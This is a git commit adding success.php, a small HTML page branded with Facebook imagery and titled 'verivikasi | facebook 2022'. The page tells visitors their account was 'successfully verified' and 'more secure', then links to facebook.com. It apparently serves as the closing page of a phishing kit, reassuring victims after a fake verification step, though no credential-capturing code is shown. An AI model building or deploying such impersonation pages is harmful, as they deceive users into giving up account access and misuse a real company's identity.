4b4737ba21207918496da4a9c88a6b3948a9ffc6
mrgood82 <tik.mrgood@gmail.com>
2022-05-15 11:18:49 +0700

    yes 1

---
+++ success.php
@@ -0,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>verivikasi | facebook 2022</title>
+
+	<style type="text/css">
+		
+		body {
+			margin: 0;
+			padding: 0;
+		}	
+		.head {
+			
+    		height: 100vh;
+    		box-sizing: border-box;
+    		
+		}	
+		.head img {
+			width: 100%;
+		}
+
+		.head {
+			text-align: center;
+		}
+
+	</style>
+</head>
+<body>
+
+<div class="head"> 
+	<img src="https://cdn.laketravis.com/wp-content/uploads/2017/02/facebook-header.jpg">
+<h1>
+	Thank You
+</h1>
+<p>You Have Successfully Verified <br>
+Your account is now more secure and usable
+</p>
+
+<button><a href="www.facebook.com">Login Facebook</a></button>	
+
+</div>
+</body>
+</html>
